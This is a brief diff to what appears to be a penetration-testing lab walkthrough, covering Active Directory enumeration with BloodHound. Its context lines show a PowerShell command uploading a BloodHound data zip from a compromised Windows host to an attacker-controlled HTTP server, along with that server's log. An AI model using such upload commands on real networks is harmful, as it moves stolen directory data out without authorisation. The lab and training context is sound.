@@ -118,8 +118,11 @@ PS C:\temp> (New-Object System.Net.WebClient).UploadFile('http://192.168.45.5/',
 Serving HTTP on localhost port 80 (http://localhost:80/) ...
 (True, "<br><br>'/home/kali/Documents/pg_practice/192.168.231.175/20230425015352_BloodHound.zip'", 'by: ', ('192.168.231.175', 49993))
 192.168.231.175 - - [25/Apr/2023 05:13:14] "POST / HTTP/1.1" 200 -
-
 ```
+
+Start `neo4j console` and start `bloodhound`
+
+Upload the zip file to ![](../.gitbook/assets/image.png)
 
 </details>
 
